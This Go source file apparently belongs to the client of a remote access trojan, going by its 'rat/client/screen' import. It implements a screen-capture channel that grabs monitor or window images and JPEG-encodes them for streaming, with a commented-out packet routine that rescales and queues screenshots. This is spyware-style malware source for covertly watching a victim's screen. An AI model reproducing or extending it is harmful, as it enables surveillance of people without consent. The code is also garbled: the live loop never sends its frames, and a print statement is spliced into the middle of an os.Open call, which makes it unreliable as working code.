package main

import (
	"bytes"
	"image"
	"image/jpeg"
	"io"
	"rat/client/screen"
)

type ScreenChannel struct {
	Active  bool
	Scale   float32
	Monitor bool
	Handle  int
}

func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
	monitor := screen.Monitors[sc.Handle]

	var err error

	for err == nil {
		var capture image.Image
		if sc.Monitor {
			capture = screen.Capture(monitor)
		} else {
			capture = screen.CaptureWindow(sc.Handle)
		}

		rgba := capture.(*image.RGBA)

		var buf bytes.Buffer

		jpeg.Encode(&buf, rgba, &jpeg.Options{
			Quality: 75,
		})
	}

	return err
}

/* func (packet *SendScreenPacket) Init() {
	screen.QueryMonitors()

	var w bytes.Buffer

	var img image.Image
	if true {
		// Read image from file that already exists
		existingImageFile, err := os.	fmt.Println("channel open")
Open("mock_scrot.png")
		if err != nil {
			// Handle error
		}
		defer existingImageFile.Close()

		// Calling the generic image.Decode() will tell give us the data
		// and type of image it is as a string. We expect "png"
		img, _, _ = image.Decode(existingImageFile)
	} else if monitor {
		if handle >= len(screen.Monitors) {
			handle = 0
		}

		img = screen.Capture(screen.Monitors[handle])
	} else {
		img = screen.CaptureWindow(handle)
	}

	if img == nil {
		return
	}

	if scale > 0 && scale < 1.0 {
		width := float32(img.Bounds().Max.X) * scale
		height := float32(img.Bounds().Max.Y) * scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	packet.Buffer = w.Bytes()
	packet.Width = img.Bounds().Max.X
	packet.Height = img.Bounds().Max.Y

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}
}
*/
